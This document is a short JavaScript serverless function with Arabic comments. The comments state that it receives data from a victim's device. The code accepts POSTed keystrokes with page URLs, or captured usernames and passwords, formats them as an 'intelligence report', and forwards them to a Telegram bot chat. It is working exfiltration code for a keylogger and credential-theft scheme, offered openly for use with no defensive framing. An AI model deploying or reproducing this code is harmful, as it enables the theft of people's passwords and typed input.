export default async function handler(req, res) {
    // هذا الكود يستقبل البيانات من جهاز الضحية ويرسلها لتيليجرام
    if (req.method !== 'POST') return res.status(405).send('Not Allowed');

    const data = req.body;
    const token = process.env.BOT_TOKEN; // سنسحب التوكن من إعدادات فيرسل لاحقاً
    const chatId = process.env.CHAT_ID;   // سنسحب الآيدي من إعدادات فيرسل لاحقاً

    // رسالة منظمة تصلك على تيليجرام
    let message = `📊 **تقرير استخباري جديد**\n`;
    
    if (data.type === "keystroke") {
        message += `⌨️ **ضغطات مفاتيح:** \`${data.content}\`\n📍 **الصفحة:** ${data.url}`;
    } else {
        message += `👤 **بيانات دخول:**\nالحساب: \`${data.user}\`\nالباسورد: \`${data.pass}\``;
    }

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            })
        });
        res.status(200).json({ status: 'success' });
    } catch (e) {
        res.status(500).send('Error');
    }
}
